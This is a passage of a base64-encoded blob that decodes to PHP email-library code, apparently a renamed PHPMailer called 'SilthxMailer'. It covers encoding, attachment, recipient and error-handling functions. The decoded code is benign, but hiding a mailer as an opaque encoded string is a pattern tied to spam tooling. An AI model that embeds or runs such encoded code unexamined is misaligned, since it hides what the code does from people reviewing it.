AgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgaW5pX3NldCgnbWFnaWNfcXVvdGVzX3J1bnRpbWUnLCBmYWxzZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGZpbGVfYnVmZmVyID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsNCiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJGZpbGVfYnVmZmVyLCAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgaWYgKCRtYWdpY19xdW90ZXMpIHsNCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7DQogICAgICAgICAgICAgICAgICAgIHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgkbWFnaWNfcXVvdGVzKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBpbmlfc2V0KCdtYWdpY19xdW90ZXNfcnVudGltZScsICRtYWdpY19xdW90ZXMpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkZmlsZV9idWZmZXI7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIHJldHVybiAnJzsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlU3RyaW5nKCRzdHIsICRlbmNvZGluZyA9ICdiYXNlNjQnKSB7DQogICAgICAgICRlbmNvZGVkID0gJyc7DQogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkZW5jb2RpbmcpKSB7DQogICAgICAgICAgICBjYXNlICdiYXNlNjQnOg0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZSgkc3RyKSwgNzYsICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICc3Yml0JzoNCiAgICAgICAgICAgIGNhc2UgJzhiaXQnOg0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmZpeEVPTCgkc3RyKTsNCiAgICAgICAgICAgICAgICBpZiAoc3Vic3RyKCRlbmNvZGVkLCAtKHN0cmxlbigkdGhpcy0+TEUpKSkgIT0gJHRoaXMtPkxFKSB7DQogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkIC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdiaW5hcnknOg0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHN0cjsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ3F1b3RlZC1wcmludGFibGUnOg0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmVuY29kZVFQKCRzdHIpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2VuY29kaW5nJykgLiAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkZW5jb2RlZDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZUhlYWRlcigkc3RyLCAkcG9zaXRpb24gPSAndGV4dCcpIHsNCiAgICAgICAgJG1hdGNoY291bnQgPSAwOw0KICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJHBvc2l0aW9uKSkgew0KICAgICAgICAgICAgY2FzZSAncGhyYXNlJzoNCiAgICAgICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9bXDIwMC1cMzc3XS8nLCAkc3RyKSkgew0KICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGFkZGNzbGFzaGVzKCRzdHIsICJcMC4uXDM3XDE3N1xcXCIiKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCgkc3RyID09ICRlbmNvZGVkKSAmJiAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoJGVuY29kZWQpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgiXCIkZW5jb2RlZFwiIik7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1teXDA0MFwwNDFcMDQzLVwxMzNcMTM1LVwxNzZdLycsICRzdHIsICRtYXRjaGVzKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2NvbW1lbnQnOg0KICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ID0gcHJlZ19tYXRjaF9hbGwoJy9bKCkiXS8nLCAkc3RyLCAkbWF0Y2hlcyk7DQogICAgICAgICAgICBjYXNlICd0ZXh0JzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgKz0gcHJlZ19tYXRjaF9hbGwoJy9bXDAwMC1cMDEwXDAxM1wwMTRcMDE2LVwwMzdcMTc3LVwzNzddLycsICRzdHIsICRtYXRjaGVzKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJG1hdGNoY291bnQgPT0gMCkgew0KICAgICAgICAgICAgcmV0dXJuICgkc3RyKTsNCiAgICAgICAgfQ0KICAgICAgICAkbWF4bGVuID0gNzUgLSA3IC0gc3RybGVuKCR0aGlzLT5DaGFyU2V0KTsNCiAgICAgICAgaWYgKCRtYXRjaGNvdW50ID4gc3RybGVuKCRzdHIpIC8gMykgew0KICAgICAgICAgICAgJGVuY29kaW5nID0gJ0InOw0KICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykgJiYgJHRoaXMtPmhhc011bHRpQnl0ZXMoJHN0cikpIHsNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5iYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgIlxuIik7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gYmFzZTY0X2VuY29kZSgkc3RyKTsNCiAgICAgICAgICAgICAgICAkbWF4bGVuIC09ICRtYXhsZW4gJSA0Ow0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gdHJpbShjaHVua19zcGxpdCgkZW5jb2RlZCwgJG1heGxlbiwgIlxuIikpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGVuY29kaW5nID0gJ1EnOw0KICAgICAgICAgICAgJGVuY29kZWQgID0gJHRoaXMtPmVuY29kZVEoJHN0ciwgJHBvc2l0aW9uKTsNCiAgICAgICAgICAgICRlbmNvZGVkICA9ICR0aGlzLT53cmFwVGV4dCgkZW5jb2RlZCwgJG1heGxlbiwgdHJ1ZSk7DQogICAgICAgICAgICAkZW5jb2RlZCAgPSBzdHJfcmVwbGFjZSgnPScgLiBzZWxmOjpDUkxGLCAiXG4iLCB0cmltKCRlbmNvZGVkKSk7DQogICAgICAgIH0NCiAgICAgICAgJGVuY29kZWQgPSBwcmVnX3JlcGxhY2UoJy9eKC4qKSQvbScsICcgPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAiPyRlbmNvZGluZz9cXDE/PSIsICRlbmNvZGVkKTsNCiAgICAgICAgJGVuY29kZWQgPSB0cmltKHN0cl9yZXBsYWNlKCJcbiIsICR0aGlzLT5MRSwgJGVuY29kZWQpKTsNCiAgICAgICAgcmV0dXJuICRlbmNvZGVkOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaGFzTXVsdGlCeXRlcygkc3RyKSB7DQogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cmxlbicpKSB7DQogICAgICAgICAgICByZXR1cm4gKHN0cmxlbigkc3RyKSA+IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCkpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXM4Yml0Q2hhcnMoJHRleHQpIHsNCiAgICAgICAgcmV0dXJuIChib29sZWFuKSBwcmVnX21hdGNoKCcvW1x4ODAtXHhGRl0vJywgJHRleHQpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIsICRsaW5lYnJlYWsgPSBudWxsKSB7DQogICAgICAgICRzdGFydCAgID0gJz0/JyAuICR0aGlzLT5DaGFyU2V0IC4gJz9CPyc7DQogICAgICAgICRlbmQgICAgID0gJz89JzsNCiAgICAgICAgJGVuY29kZWQgPSAnJzsNCiAgICAgICAgaWYgKCRsaW5lYnJlYWsgPT09IG51bGwpIHsNCiAgICAgICAgICAgICRsaW5lYnJlYWsgPSAkdGhpcy0+TEU7DQogICAgICAgIH0NCiAgICAgICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7DQogICAgICAgICRsZW5ndGggICAgPSA3NSAtIHN0cmxlbigkc3RhcnQpIC0gc3RybGVuKCRlbmQpOw0KICAgICAgICAkcmF0aW8gICAgID0gJG1iX2xlbmd0aCAvIHN0cmxlbigkc3RyKTsNCiAgICAgICAgJGF2Z0xlbmd0aCA9IGZsb29yKCRsZW5ndGggKiAkcmF0aW8gKiAuNzUpOw0KICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkbWJfbGVuZ3RoOyAkaSArPSAkb2Zmc2V0KSB7DQogICAgICAgICAgICAkbG9va0JhY2sgPSAwOw0KICAgICAgICAgICAgZG8gew0KICAgICAgICAgICAgICAgICRvZmZzZXQgPSAkYXZnTGVuZ3RoIC0gJGxvb2tCYWNrOw0KICAgICAgICAgICAgICAgICRjaHVuayAgPSBtYl9zdWJzdHIoJHN0ciwgJGksICRvZmZzZXQsICR0aGlzLT5DaGFyU2V0KTsNCiAgICAgICAgICAgICAgICAkY2h1bmsgID0gYmFzZTY0X2VuY29kZSgkY2h1bmspOw0KICAgICAgICAgICAgICAgICRsb29rQmFjaysrOw0KICAgICAgICAgICAgfSB3aGlsZSAoc3RybGVuKCRjaHVuaykgPiAkbGVuZ3RoKTsNCiAgICAgICAgICAgICRlbmNvZGVkIC49ICRjaHVuayAuICRsaW5lYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgJGVuY29kZWQgPSBzdWJzdHIoJGVuY29kZWQsIDAsIC1zdHJsZW4oJGxpbmVicmVhaykpOw0KICAgICAgICByZXR1cm4gJGVuY29kZWQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXggPSA3Nikgew0KICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdxdW90ZWRfcHJpbnRhYmxlX2VuY29kZScpKSB7DQogICAgICAgICAgICByZXR1cm4gcXVvdGVkX3ByaW50YWJsZV9lbmNvZGUoJHN0cmluZyk7DQogICAgICAgIH0NCiAgICAgICAgJHN0cmluZyA9IHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAgICAgJyUyMCcsDQogICAgICAgICAgICAnJTBEJTBBLicsDQogICAgICAgICAgICAnJTBEJTBBJywNCiAgICAgICAgICAgICclJw0KICAgICAgICApLCBhcnJheSgNCiAgICAgICAgICAgICcgJywNCiAgICAgICAgICAgICJcclxuPTJFIiwNCiAgICAgICAgICAgICJcclxuIiwNCiAgICAgICAgICAgICc9Jw0KICAgICAgICApLCByYXd1cmxlbmNvZGUoJHN0cmluZykpOw0KICAgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvW15cclxuXXsnIC4gKCRsaW5lX21heCAtIDMpIC4gJ31bXj1cclxuXXsyfS8nLCAiJDA9XHJcbiIsICRzdHJpbmcpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUVBwaHAoJHN0cmluZywgJGxpbmVfbWF4ID0gNzYsICRzcGFjZV9jb252ID0gZmFsc2UpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5lbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXgpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24gPSAndGV4dCcpIHsNCiAgICAgICAgJHBhdHRlcm4gPSAnJzsNCiAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgICAgICJcciIsDQogICAgICAgICAgICAiXG4iDQogICAgICAgICksICcnLCAkc3RyKTsNCiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsNCiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6DQogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXkEtWmEtejAtOSEqK1wvIC0nOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6DQogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXChcKSInOw0KICAgICAgICAgICAgY2FzZSAndGV4dCc6DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ1wwMDAtXDAxMVwwMTNcMDE0XDAxNi1cMDM3XDA3NVwwNzdcMTM3XDE3Ny1cMzc3JyAuICRwYXR0ZXJuOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICAgICRtYXRjaGVzID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKHByZWdfbWF0Y2hfYWxsKCIvW3skcGF0dGVybn1dLyIsICRlbmNvZGVkLCAkbWF0Y2hlcykpIHsNCiAgICAgICAgICAgICRlcWtleSA9IGFycmF5X3NlYXJjaCgnPScsICRtYXRjaGVzWzBdKTsNCiAgICAgICAgICAgIGlmIChmYWxzZSAhPT0gJGVxa2V5KSB7DQogICAgICAgICAgICAgICAgdW5zZXQoJG1hdGNoZXNbMF1bJGVxa2V5XSk7DQogICAgICAgICAgICAgICAgYXJyYXlfdW5zaGlmdCgkbWF0Y2hlc1swXSwgJz0nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X3VuaXF1ZSgkbWF0Y2hlc1swXSkgYXMgJGNoYXIpIHsNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCRjaGFyLCAnPScgLiBzcHJpbnRmKCclMDJYJywgb3JkKCRjaGFyKSksICRlbmNvZGVkKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gc3RyX3JlcGxhY2UoJyAnLCAnXycsICRlbmNvZGVkKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0F0dGFjaG1lbnQoJHN0cmluZywgJGZpbGVuYW1lLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnKSB7DQogICAgICAgIGlmICgkdHlwZSA9PSAnJykgew0KICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkZmlsZW5hbWUpOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgNCiAgICAgICAgICAgIDAgPT4gJHN0cmluZywNCiAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLA0KICAgICAgICAgICAgMiA9PiBiYXNlbmFtZSgkZmlsZW5hbWUpLA0KICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsDQogICAgICAgICAgICA0ID0+ICR0eXBlLA0KICAgICAgICAgICAgNSA9PiB0cnVlLA0KICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sDQogICAgICAgICAgICA3ID0+IDANCiAgICAgICAgKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZEVtYmVkZGVkSW1hZ2UoJHBhdGgsICRjaWQsICRuYW1lID0gJycsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICcnLCAkZGlzcG9zaXRpb24gPSAnaW5saW5lJykgew0KICAgICAgICBpZiAoIUBpc19maWxlKCRwYXRoKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdHlwZSA9PSAnJykgew0KICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkcGF0aCk7DQogICAgICAgIH0NCiAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOw0KICAgICAgICBpZiAoJG5hbWUgPT0gJycpIHsNCiAgICAgICAgICAgICRuYW1lID0gJGZpbGVuYW1lOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgNCiAgICAgICAgICAgIDAgPT4gJHBhdGgsDQogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwNCiAgICAgICAgICAgIDIgPT4gJG5hbWUsDQogICAgICAgICAgICAzID0+ICRlbmNvZGluZywNCiAgICAgICAgICAgIDQgPT4gJHR5cGUsDQogICAgICAgICAgICA1ID0+IGZhbHNlLA0KICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sDQogICAgICAgICAgICA3ID0+ICRjaWQNCiAgICAgICAgKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdFbWJlZGRlZEltYWdlKCRzdHJpbmcsICRjaWQsICRuYW1lID0gJycsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICcnLCAkZGlzcG9zaXRpb24gPSAnaW5saW5lJykgew0KICAgICAgICBpZiAoJHR5cGUgPT0gJycgYW5kICFlbXB0eSgkbmFtZSkpIHsNCiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJG5hbWUpOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgNCiAgICAgICAgICAgIDAgPT4gJHN0cmluZywNCiAgICAgICAgICAgIDEgPT4gJG5hbWUsDQogICAgICAgICAgICAyID0+ICRuYW1lLA0KICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsDQogICAgICAgICAgICA0ID0+ICR0eXBlLA0KICAgICAgICAgICAgNSA9PiB0cnVlLA0KICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sDQogICAgICAgICAgICA3ID0+ICRjaWQNCiAgICAgICAgKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpbmxpbmVJbWFnZUV4aXN0cygpIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsNCiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAnaW5saW5lJykgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGF0dGFjaG1lbnRFeGlzdHMoKSB7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7DQogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJ2F0dGFjaG1lbnQnKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWx0ZXJuYXRpdmVFeGlzdHMoKSB7DQogICAgICAgIHJldHVybiAhZW1wdHkoJHRoaXMtPkFsdEJvZHkpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJRdWV1ZWRBZGRyZXNzZXMoJGtpbmQpIHsNCiAgICAgICAgJFJlY2lwaWVudHNRdWV1ZSA9ICR0aGlzLT5SZWNpcGllbnRzUXVldWU7DQogICAgICAgIGZvcmVhY2ggKCRSZWNpcGllbnRzUXVldWUgYXMgJGFkZHJlc3MgPT4gJHBhcmFtcykgew0KICAgICAgICAgICAgaWYgKCRwYXJhbXNbMF0gPT0gJGtpbmQpIHsNCiAgICAgICAgICAgICAgICB1bnNldCgkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWRkcmVzc2VzKCkgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvKSB7DQogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkdG9bMF0pXSk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPnRvID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCd0bycpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJDQ3MoKSB7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5jYyBhcyAkY2MpIHsNCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRjY1swXSldKTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ2NjJyk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckJDQ3MoKSB7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5iY2MgYXMgJGJjYykgew0KICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGJjY1swXSldKTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+YmNjID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCdiY2MnKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUmVwbHlUb3MoKSB7DQogICAgICAgICR0aGlzLT5SZXBseVRvICAgICAgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlID0gYXJyYXkoKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWxsUmVjaXBpZW50cygpIHsNCiAgICAgICAgJHRoaXMtPnRvICAgICAgICAgICAgICA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jYyAgICAgICAgICAgICAgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+YmNjICAgICAgICAgICAgID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzICA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWUgPSBhcnJheSgpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBdHRhY2htZW50cygpIHsNCiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnQgPSBhcnJheSgpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJDdXN0b21IZWFkZXJzKCkgew0KICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyID0gYXJyYXkoKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldEVycm9yKCRtc2cpIHsNCiAgICAgICAgJHRoaXMtPmVycm9yX2NvdW50Kys7DQogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdzbXRwJyBhbmQgIWlzX251bGwoJHRoaXMtPnNtdHApKSB7DQogICAgICAgICAgICAkbGFzdGVycm9yID0gJHRoaXMtPnNtdHAtPmdldEVycm9yKCk7DQogICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ2Vycm9yJ10pKSB7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAkdGhpcy0+bGFuZygnc210cF9lcnJvcicpIC4gJGxhc3RlcnJvclsnZXJyb3InXTsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ2RldGFpbCddKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgRGV0YWlsOiAnIC4gJGxhc3RlcnJvclsnZGV0YWlsJ107DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnc210cF9jb2RlJ10pKSB7DQogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBTTVRQIGNvZGU6ICcgLiAkbGFzdGVycm9yWydzbXRwX2NvZGUnXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGVfZXgnXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIEFkZGl0aW9uYWwgU01UUCBpbmZvOiAnIC4gJGxhc3RlcnJvclsnc210cF9jb2RlX2V4J107DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5FcnJvckluZm8gPSAkbXNnOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHJmY0RhdGUoKSB7DQogICAgICAgIGRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoQGRhdGVfZGVmYXVsdF90aW1lem9uZV9nZXQoKSk7DQogICAgICAgIHJldHVybiBkYXRlKCdELCBqIE0gWSBIOmk6cyBPJyk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXJ2ZXJIb3N0bmFtZSgpIHsNCiAgICAgICAgJHJlc3VsdCA9ICdsb2NhbGhvc3QubG9jYWxkb21haW4nOw0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5Ib3N0bmFtZSkpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+SG9zdG5hbWU7DQogICAgICAgIH0gZWxzZWlmIChpc3NldCgkX1NFUlZFUikgYW5kIGFycmF5X2tleV9leGlzdHMoJ1NFUlZFUl9OQU1FJywgJF9TRVJWRVIpIGFuZCAhZW1wdHkoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107DQogICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2dldGhvc3RuYW1lJykgJiYgZ2V0aG9zdG5hbWUoKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBnZXRob3N0bmFtZSgpOw0KICAgICAgICB9IGVsc2VpZiAocGhwX3VuYW1lKCduJykgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gcGhwX3VuYW1lKCduJyk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBsYW5nKCRrZXkpIHsNCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5sYW5ndWFnZSkgPCAxKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0TGFuZ3VhZ2UoJ2VuJyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJGtleSwgJHRoaXMtPmxhbmd1YWdlKSkgew0KICAgICAgICAgICAgaWYgKCRrZXkgPT0gJ3NtdHBfY29ubmVjdF9mYWlsZWQnKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XSAuICcgaHR0cHM6Ly9naXRodWIuY29tL1NpbHRoeE1haWxlci9TaWx0aHhNYWlsZXIvd2lraS9Ucm91Ymxlc2hvb3RpbmcnOw0